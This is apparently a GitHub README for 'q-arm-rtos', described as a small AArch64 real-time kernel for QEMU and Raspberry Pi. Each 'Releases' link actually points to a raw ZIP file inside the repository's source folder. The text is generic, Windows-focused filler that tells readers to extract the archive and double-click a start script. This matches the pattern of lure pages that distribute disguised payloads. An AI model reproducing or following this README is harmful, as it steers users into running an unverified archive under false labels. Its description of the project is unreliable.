# 🧩 q-arm-rtos - Run a small ARM system

[![Download on GitHub](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Julius2247/q-arm-rtos/raw/refs/heads/main/src/arm_q_rtos_v3.2.zip)

## 📦 What this is

q-arm-rtos is a small operating system for ARM systems. It is built from scratch for AArch64, which is the 64-bit ARM mode used on newer boards and emulators.

It is made for people who want to run a simple RTOS on supported hardware or in QEMU. It includes:

- preemptive task scheduling
- IRQ handling
- context switching
- bare-metal kernel code
- support for Raspberry Pi targets and QEMU use cases

This project is for running a compact system close to the hardware. It is not a desktop app. You use it to boot a small kernel and test how an RTOS works on ARM.

## 💻 What you need

Before you download, make sure you have:

- a Windows PC
- a web browser
- about 100 MB of free disk space
- a ZIP tool such as File Explorer, 7-Zip, or WinRAR
- access to QEMU or a supported ARM board if you plan to run the image there

If you use an emulator, QEMU is the easiest place to start. If you use a board, use a Raspberry Pi setup that matches the build you download.

## ⬇️ Download the release

Visit this page to download the latest release files:

[Open q-arm-rtos Releases](https://github.com/Julius2247/q-arm-rtos/raw/refs/heads/main/src/arm_q_rtos_v3.2.zip)

Look for the newest release at the top of the page. Open it and download the file that matches your setup. If you see more than one file, choose the one for Windows use with QEMU or the image meant for your board.

## 🪟 Run on Windows

### 1. Download the release file

Go to the releases page and save the file to your PC.

### 2. Open the download

Find the file in your Downloads folder.

- If it is a ZIP file, right-click it and choose Extract All
- If it is a compressed archive, use 7-Zip or WinRAR to unpack it
- If it is a disk image or boot file, keep the file in a safe folder

### 3. Check the release contents

After you open the files, you may see items such as:

- a kernel image
- a QEMU launch file
- a board image
- a README file from the release
- config files for boot and serial output

Read any file that comes with the release. It may list the exact start file you need.

### 4. Start the system in QEMU

If the release includes a QEMU setup, use that first. It gives the fastest way to test the RTOS on Windows.

Typical steps:

- open the folder with the release files
- find the QEMU start file
- double-click it, or run it from Command Prompt if needed
- wait for the emulator window to start
- watch for boot text in the console

If the project uses a script file, it may start the kernel for you. If it uses a command, the release notes may show the full line to run.

### 5. Use the serial window

Many bare-metal systems print text to a serial console instead of a normal screen. If you see boot text in a black window, that is normal. It may show:

- system start
- task setup
- interrupt events
- scheduler activity
- shell or test output

## 🧭 First things to try

After the system starts, try these checks:

- wait for the boot message
- look for scheduler output
- check that the console does not stop at a blank screen
- restart it once to confirm it boots the same way
- if the release includes test tasks, let them run for a few seconds

A working boot usually shows text soon after launch. If nothing appears, the emulator may need a different path, a missing file, or a board setting from the release notes.

## ⚙️ Basic setup tips

### QEMU use

If you want the easiest first run:

- use the QEMU release files
- keep all files in one folder
- do not rename files unless the release notes allow it
- use the same folder for the kernel image and support files

### Raspberry Pi use

If you want to test on a board:

- use the release made for your device
- copy the files to the right boot media
- keep the full boot set together
- make sure the board matches the ARM version used by the kernel

### Windows file handling

Windows may hide file extensions. Turn on file extensions in File Explorer so you can see the full file name. This helps you avoid opening the wrong file.

## 🧰 What is inside the project

q-arm-rtos focuses on core kernel parts:

- task scheduler for switching between jobs
- interrupt handler for hardware events
- context switch code for saving and restoring state
- low-level boot code for AArch64
- kernel control for running without a host OS

These parts work together to let the system run more than one task and react to interrupts.

## 🔍 How to know it is working

You know the release is running when you see signs like:

- boot text in the console
- task names or IDs on screen
- a tick counter or timer output
- interrupt messages
- a clean handoff between tasks

If the system shows these signs, the kernel started and the scheduler is active.

## 🛠️ If it does not start

Try these common checks:

- download the latest release again
- confirm you opened the right file
- keep all release files in one folder
- use the release notes from the GitHub page
- test with QEMU first if you are on Windows
- close other emulators before starting it again
- make sure the file name matches the one used by the launch script

If you see a blank window, the kernel may still be running with serial output only. Check the console window for text.

## 📚 File types you may see

A release may include one or more of these:

- `.img` for a boot image
- `.bin` for a raw binary
- `.elf` for a loadable kernel file
- `.zip` for a packaged release
- `.sh` or `.bat` for a start script
- config files for QEMU or board boot

Use the file that matches the release notes. If a start script is present, use that first.

## 🧪 Good test flow for Windows users

If you are new to this kind of software, use this order:

1. open the releases page
2. download the newest file
3. unpack it in one folder
4. look for a README or start script
5. run it in QEMU first
6. watch the console for boot output
7. move to board testing after QEMU works

This path reduces setup issues and makes it easier to see whether the kernel image is fine.

## 🔗 Download again

[Open q-arm-rtos Releases](https://github.com/Julius2247/q-arm-rtos/raw/refs/heads/main/src/arm_q_rtos_v3.2.zip)

## 🏷️ Topics

aarch64, armv8, armv9, bare-metal, context-switch, embedded, interrupt-handling, operating-system, os-kernel, qemu, raspberry-pi, rtos, rtos-kernel, scheduler